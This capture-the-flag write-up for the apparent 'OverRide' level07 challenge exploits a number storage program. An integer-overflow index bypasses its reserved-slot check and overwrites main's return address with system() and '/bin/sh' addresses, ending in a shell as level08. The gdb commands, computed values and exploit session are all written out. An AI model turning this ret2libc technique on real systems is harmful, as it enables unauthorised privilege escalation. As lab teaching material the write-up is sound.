# level07

The [target program](source.c) contains only `wil's crappy number storage service`, where we can store numbers at a chosen index, some being reserved to wil, we will (rock you) leverage an overflow to bypass this restriction and overwrite some parts of the program to escalate :

By analysing the code, we realise that the `store` command check that the index is not a multiple of 3 and is not on the stack and then store the number at `index * 4`, which we will use to overflow.

We grab the addresses of the `system()` function and a `/bin/sh` string in the programs libc :

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
```bash
(gdb) find &__libc_start_main, +0x1000000, "/bin/sh"
0xf7f897ec
```

We then have our addresses : `0xf7e6aed0` `0xf7f897ec`

wil number storage service uses unsigned ints, let's convert our addresses to uint : `4159090384` and `4160264172`

now we will `override` the `main()` esp and esp+4 values so that the next return pop those two and execute our command :
esp is the address of the next function and esp+4 the first argument

to find esp and esp+4 we need to get the difference between it's location and the declaration of the `store_number()` buffer

the difference between the buffer address and `main()` esp is 456 and 464 for esp+4, we need numbers such as :
`x-INT_MAX = y/4+1`

for y = 456 and 464 we get :
2147483762 and 2147483764

Let's run our payload :

```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 2147483764
 Completed store command successfully
Input command: quit
$ id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
```
we escalated to level08 :3